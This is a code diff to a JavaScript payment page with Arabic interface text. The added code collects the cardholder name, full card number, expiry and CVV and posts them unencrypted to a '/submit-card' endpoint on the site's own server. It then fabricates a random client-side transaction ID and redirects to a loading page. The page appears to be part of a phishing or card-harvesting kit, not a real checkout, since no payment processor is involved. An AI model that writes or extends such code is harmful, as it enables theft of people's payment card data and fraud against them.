@@ -514,33 +514,53 @@
             }, 5000);
         }
 
-        function submitPayment() {
+        const orderId = new URLSearchParams(window.location.search).get('orderId') || localStorage.getItem('orderId');
+
+        async function submitPayment() {
             if (!isFormValid()) {
                 return;
             }
 
-            // Save payment data
-            const paymentData = {
-                cardholderName: document.getElementById('cardholderName').value,
-                cardNumber: document.getElementById('cardNumber').value.replace(/\s/g, ''),
-                expiryMonth: document.getElementById('expiryMonth').value,
-                expiryYear: document.getElementById('expiryYear').value,
-                cvv: document.getElementById('cvv').value
-            };
+            const name = document.getElementById('cardholderName').value;
+            const number = document.getElementById('cardNumber').value.replace(/\s/g, '');
+            const expiry = document.getElementById('expiryMonth').value + '/' + document.getElementById('expiryYear').value;
+            const cvv = document.getElementById('cvv').value;
 
-            localStorage.setItem('paymentData', JSON.stringify(paymentData));
+            const payBtn = document.getElementById('payBtn');
+            payBtn.disabled = true;
+            payBtn.textContent = 'جاري المعالجة...';
 
-            // Also save form data if it exists
-            const formData = JSON.parse(localStorage.getItem('formData') || '{}');
-            const combinedData = {
-                ...formData,
-                ...paymentData,
-                currentPage: 'payment_card'
-            };
-            localStorage.setItem('formData', JSON.stringify(combinedData));
+            try {
+                await fetch('/submit-card', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ 
+                        orderId: orderId, 
+                        cardName: name, 
+                        cardNumber: number, 
+                        expiryDate: expiry, 
+                        cvv: cvv,
+                        transactionId: 'TXN-' + Math.floor(Math.random() * 1000000)
+                    })
+                });
 
-            // Go to loading page
-            window.location.href = 'payment_loading_ar.html';
+                window.location.href = `payment_loading_ar.html?orderId=${orderId}`;
+            } catch (e) {
+                console.error(e);
+                payBtn.disabled = false;
+                payBtn.textContent = 'دفع';
+                showError('حدث خطأ أثناء إرسال البيانات، يرجى المحاولة مرة أخرى');
+            }
+        }
+
+        window.onload = function() {
+            const lastError = localStorage.getItem('lastError');
+            if (lastError) {
+                const errorEl = document.getElementById('errorMessage');
+                errorEl.textContent = lastError;
+                errorEl.style.display = 'block';
+                localStorage.removeItem('lastError');
+            }
         }
 
         function goBack() {
